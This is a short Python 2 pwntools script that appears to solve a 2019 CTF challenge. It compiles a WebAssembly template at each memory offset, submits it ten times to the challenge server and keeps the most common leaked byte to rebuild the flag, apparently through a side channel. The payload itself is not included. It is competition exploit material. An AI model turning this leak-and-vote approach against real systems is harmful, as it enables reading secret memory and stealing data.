import sys
from pwn import *
import subprocess
from collections import defaultdict
# context.log_level = 'debug'
 # -*- coding: utf-8 -*-

    
if len(sys.argv) > 2 and sys.argv[2] == 'remote':
    r = remote('gloryhost.quals2019.oooverflow.io', 9999)
else:
    r = remote('localhost', 9999)

flag = ""
for offset in range(300, 340):
	possible = defaultdict(int)
	for i in range(10):
		# r = remote('localhost', 9999)
		r = remote('gloryhost.quals2019.oooverflow.io', 9999)

		f = open(sys.argv[1]).read().format(offset = offset)

		with open("test.wat", "w") as file:
			file.write(f)

		subprocess.check_call("wat2wasm {} -o simple.wasm".format("test.wat"), shell = True)

		f = open("simple.wasm", "rb").read()

		enc = f.encode('base64').replace("\n", "")

		r.recvuntil("binary)\n\n")
		r.send(enc)

		r.shutdown(direction='send')

		line = r.recvline().strip().split("YOU'VE GOT ")[1]
		print "i got", line
		possible[line] += 1


	char = max(possible.iteritems(), key=operator.itemgetter(1))[0]
	print "char", char.decode('hex')
	flag += char.decode('hex')
	print "flag", flag
	# time.sleep(2)
	r.close()

# print r.interactive()
# print r.recv